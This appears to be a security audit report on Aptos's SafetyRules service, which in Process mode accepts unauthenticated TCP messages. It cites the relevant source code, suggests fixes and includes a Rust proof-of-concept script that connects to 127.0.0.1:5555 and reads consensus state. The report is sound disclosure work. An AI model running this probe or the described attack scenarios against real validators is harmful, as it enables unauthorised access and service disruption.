# Audit Report

## Title
Unauthenticated Access to SafetyRules Service Allows Local Attacker to Query State and Manipulate Consensus Operations

## Summary
The `handle_message()` function in `SerializerService` accepts and processes raw network messages without any authentication or origin verification. When SafetyRules runs in Process mode, any local process that can connect to the TCP socket can send arbitrary consensus commands to the validator's SafetyRules service, bypassing all access controls. [1](#0-0) 

## Finding Description
The SafetyRules component is responsible for critical consensus operations including signing proposals, votes, timeouts, and managing epoch transitions. It holds the validator's consensus private key and enforces safety rules to prevent equivocation.

When configured with `SafetyRulesService::Process`, the SafetyRules service runs as a separate process and listens on a TCP socket for incoming requests. The complete attack path is:

1. **Unauthenticated TCP Server**: The `NetworkServer` accepts any TCP connection without authentication or TLS. [2](#0-1) 

2. **Direct Message Processing**: The `process_one_message()` function reads raw bytes from the network and passes them directly to `handle_message()` without any authentication check. [3](#0-2) 

3. **Unrestricted Deserialization**: The `handle_message()` function deserializes the input and dispatches to critical consensus operations without verifying the sender's identity or authorization. [1](#0-0) 

**Attack Scenarios:**

1. **Information Disclosure**: An attacker can call `ConsensusState` to leak the validator's current epoch, round, last voted round, and preferred round.

2. **Denial of Service**: An attacker can flood the service with messages, preventing legitimate consensus operations.

3. **Consensus State Manipulation**: An attacker can potentially:
   - Send `Initialize` messages with valid EpochChangeProofs obtained from other sources
   - Send signing requests that pass SafetyRules validation but shouldn't be signed
   - Cause timing-based race conditions in consensus

4. **Replay Attacks**: If an attacker can observe legitimate messages on localhost (e.g., via another compromised process), they can replay or modify them.

While SafetyRules has internal validation that prevents obvious violations (epoch checks, round checks, QC verification), it validates the **content** but not the **origin** of requests. The lack of authentication is a clear access control failure.

## Impact Explanation
This is a **MEDIUM severity** vulnerability per Aptos bug bounty criteria:

**Affected Deployments:**
- **Mainnet**: NOT directly vulnerable - the configuration sanitizer enforces Local mode for mainnet validators for "optimal performance" [4](#0-3) 

- **Testnet/Devnet**: VULNERABLE if validators use Process mode
- **Development Environments**: VULNERABLE

**Security Impact:**
1. **Information Disclosure**: Leaks validator consensus state (low-medium impact)
2. **Denial of Service**: Can disrupt validator operations (medium impact)
3. **State Inconsistencies**: Potential for consensus manipulation requiring intervention (medium impact)

While not achieving the Critical severity threshold (no direct fund loss or consensus safety break), this represents a significant protocol violation that could affect network availability and validator operations in test environments.

## Likelihood Explanation
**Likelihood: MEDIUM**

**Attacker Requirements:**
- Local access to the validator machine (malware, compromised service, container escape)
- Ability to connect to the SafetyRules TCP socket (default: 127.0.0.1:5555)
- Knowledge of the SafetyRulesInput message format

**Mitigating Factors:**
- Requires local access (not remotely exploitable)
- Mainnet validators are forced to use Local mode
- Default configuration binds to localhost only [5](#0-4) 

**Aggravating Factors:**
- No authentication makes exploitation trivial once local access is achieved
- Testnet/devnet validators may use Process mode for testing
- Misconfiguration could bind to 0.0.0.0, exposing it to the network

## Recommendation
Implement authentication and authorization for all SafetyRules messages:

**Option 1: Mutual TLS with Client Certificates**
```rust
// Use TLS with client certificate verification
// Only allow connections from the authorized consensus process
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, 
               network_timeout_ms: u64, tls_config: TlsConfig) {
    let mut safety_rules = SafetyRules::new(storage, false);
    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server = TlsNetworkServer::new(
        "safety-rules".to_string(), 
        listen_addr, 
        network_timeout_ms,
        tls_config
    );
    // ... rest of implementation
}
```

**Option 2: Unix Domain Sockets with Filesystem Permissions**
```rust
// Use Unix domain sockets instead of TCP for local communication
// Leverage OS-level access controls
pub fn execute(storage: PersistentSafetyStorage, socket_path: PathBuf, 
               network_timeout_ms: u64) {
    // Set restrictive permissions (0600) on socket
    // Only the validator process owner can connect
}
```

**Option 3: HMAC-based Message Authentication**
```rust
pub fn handle_message(&mut self, input_message: Vec<u8>, hmac: &[u8]) -> Result<Vec<u8>, Error> {
    // Verify HMAC before processing
    if !verify_hmac(&input_message, hmac, &self.shared_secret) {
        return Err(Error::Unauthenticated);
    }
    
    let input = serde_json::from_slice(&input_message)?;
    // ... rest of implementation
}
```

**Immediate Mitigation:**
- Document that Process mode should NEVER be used in production
- Extend the sanitizer to forbid Process mode for all network types (not just mainnet)
- Add runtime warnings when Process mode is detected

## Proof of Concept
```rust
// Proof of Concept - Unauthorized SafetyRules Access
// This demonstrates connecting to an unauthenticated SafetyRules service
// and querying its consensus state

use std::net::TcpStream;
use std::io::{Read, Write};
use serde_json;

#[derive(serde::Serialize)]
enum SafetyRulesInput {
    ConsensusState,
}

fn exploit_safety_rules(target: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Step 1: Connect to SafetyRules TCP socket (no authentication required)
    let mut stream = TcpStream::connect(target)?;
    println!("[+] Connected to SafetyRules at {}", target);
    
    // Step 2: Craft a ConsensusState query message
    let query = SafetyRulesInput::ConsensusState;
    let serialized = serde_json::to_vec(&query)?;
    
    // Step 3: Send message length prefix (u32 little-endian)
    let len = (serialized.len() as u32).to_le_bytes();
    stream.write_all(&len)?;
    
    // Step 4: Send the query message
    stream.write_all(&serialized)?;
    println!("[+] Sent ConsensusState query");
    
    // Step 5: Read response length
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf)?;
    let response_len = u32::from_le_bytes(len_buf) as usize;
    
    // Step 6: Read response data (contains sensitive consensus state)
    let mut response = vec![0u8; response_len];
    stream.read_exact(&mut response)?;
    println!("[+] Received {} bytes of consensus state data", response_len);
    
    Ok(response)
}

#[test]
fn test_unauthenticated_access() {
    // This test would succeed against a SafetyRules instance in Process mode
    // demonstrating the vulnerability
    
    // Assumes SafetyRules is running at 127.0.0.1:5555
    match exploit_safety_rules("127.0.0.1:5555") {
        Ok(data) => {
            println!("[!] VULNERABILITY CONFIRMED: Successfully accessed SafetyRules without authentication");
            println!("[!] Leaked consensus state: {:?}", data);
        },
        Err(e) => {
            println!("[*] Could not connect (SafetyRules may not be in Process mode): {}", e);
        }
    }
}
```

**Notes**

This vulnerability represents a **defense-in-depth** failure. While mainnet validators are protected by configuration enforcement, the underlying code lacks proper access controls. The authentication bypass affects:

1. **Testnet/Devnet validators** that may use Process mode for operational testing
2. **Development environments** where Process mode might be enabled
3. **Future-proofing**: Code changes could inadvertently enable Process mode in production

The SafetyRules component is security-critical as it holds validator consensus keys and enforces safety rules. Any component with such privilege should implement defense-in-depth authentication, regardless of configuration-level protections. The current implementation violates the principle of least privilege and fails the access control invariant.

### Citations

**File:** consensus/safety-rules/src/serializer.rs (L45-82)
```rust
    pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
        let input = serde_json::from_slice(&input_message)?;

        let output = match input {
            SafetyRulesInput::ConsensusState => {
                serde_json::to_vec(&self.internal.consensus_state())
            },
            SafetyRulesInput::Initialize(li) => serde_json::to_vec(&self.internal.initialize(&li)),
            SafetyRulesInput::SignProposal(block_data) => {
                serde_json::to_vec(&self.internal.sign_proposal(&block_data))
            },
            SafetyRulesInput::SignTimeoutWithQC(timeout, maybe_tc) => serde_json::to_vec(
                &self
                    .internal
                    .sign_timeout_with_qc(&timeout, maybe_tc.as_ref().as_ref()),
            ),
            SafetyRulesInput::ConstructAndSignVoteTwoChain(vote_proposal, maybe_tc) => {
                serde_json::to_vec(
                    &self.internal.construct_and_sign_vote_two_chain(
                        &vote_proposal,
                        maybe_tc.as_ref().as_ref(),
                    ),
                )
            },
            SafetyRulesInput::ConstructAndSignOrderVote(order_vote_proposal) => serde_json::to_vec(
                &self
                    .internal
                    .construct_and_sign_order_vote(&order_vote_proposal),
            ),
            SafetyRulesInput::SignCommitVote(ledger_info, new_ledger_info) => serde_json::to_vec(
                &self
                    .internal
                    .sign_commit_vote(*ledger_info, *new_ledger_info),
            ),
        };

        Ok(output?)
    }
```

**File:** secure/net/src/lib.rs (L272-405)
```rust
pub struct NetworkServer {
    service: String,
    listener: Option<TcpListener>,
    stream: Option<NetworkStream>,
    /// Read, Write, Connect timeout in milliseconds.
    timeout_ms: u64,
}

impl NetworkServer {
    pub fn new(service: String, listen: SocketAddr, timeout_ms: u64) -> Self {
        let listener = TcpListener::bind(listen);
        Self {
            service,
            listener: Some(listener.unwrap()),
            stream: None,
            timeout_ms,
        }
    }

    fn increment_counter(&self, method: Method, result: MethodResult) {
        increment_counter(&self.service, NetworkMode::Server, method, result)
    }

    /// If there isn't already a downstream client, it accepts. Otherwise it
    /// blocks until able to successfully read an entire message
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        self.increment_counter(Method::Read, MethodResult::Query);

        let result = {
            let stream = self.client()?;
            stream.read().map_err(|e| (stream.remote, e))
        };

        if let Err((remote, err)) = &result {
            self.increment_counter(Method::Read, MethodResult::Failure);
            warn!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::DisconnectedPeerOnRead,
            )
            .error(err)
            .remote_peer(remote));

            self.stream = None;
        } else {
            self.increment_counter(Method::Read, MethodResult::Success);
        }

        result.map_err(|err| err.1)
    }

    /// Shutdown the internal network stream
    pub fn shutdown(&mut self) -> Result<(), Error> {
        info!(SecureNetLogSchema::new(
            &self.service,
            NetworkMode::Server,
            LogEvent::Shutdown,
        ));

        self.listener.take().ok_or(Error::AlreadyShutdown)?;
        let stream = self.stream.take().ok_or(Error::NoActiveStream)?;
        stream.shutdown()?;
        Ok(())
    }

    /// If there isn't already a downstream client, it accepts. Otherwise it
    /// blocks until it is able to successfully send an entire message.
    pub fn write(&mut self, data: &[u8]) -> Result<(), Error> {
        self.increment_counter(Method::Write, MethodResult::Query);

        let result = {
            let stream = self.client()?;
            stream.write(data).map_err(|e| (stream.remote, e))
        };

        if let Err((remote, err)) = &result {
            self.increment_counter(Method::Write, MethodResult::Failure);
            warn!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::DisconnectedPeerOnWrite,
            )
            .error(err)
            .remote_peer(remote));

            self.stream = None;
        } else {
            self.increment_counter(Method::Write, MethodResult::Success);
        }

        result.map_err(|err| err.1)
    }

    fn client(&mut self) -> Result<&mut NetworkStream, Error> {
        if self.stream.is_none() {
            self.increment_counter(Method::Connect, MethodResult::Query);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionAttempt,
            ));

            let listener = self.listener.as_mut().ok_or(Error::AlreadyShutdown)?;

            let (stream, stream_addr) = match listener.accept() {
                Ok(ok) => ok,
                Err(err) => {
                    self.increment_counter(Method::Connect, MethodResult::Failure);
                    let err = err.into();
                    warn!(SecureNetLogSchema::new(
                        &self.service,
                        NetworkMode::Server,
                        LogEvent::ConnectionSuccessful,
                    )
                    .error(&err));
                    return Err(err);
                },
            };

            self.increment_counter(Method::Connect, MethodResult::Success);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionSuccessful,
            )
            .remote_peer(&stream_addr));

            stream.set_nodelay(true)?;
            self.stream = Some(NetworkStream::new(stream, stream_addr, self.timeout_ms));
        }

        self.stream.as_mut().ok_or(Error::NoActiveStream)
    }
}
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** config/src/config/safety_rules_config.rs (L98-105)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }

```

**File:** config/src/config/test_data/validator.yaml (L14-16)
```yaml
        service:
            type: process
            server_address: "/ip4/127.0.0.1/tcp/5555"
```
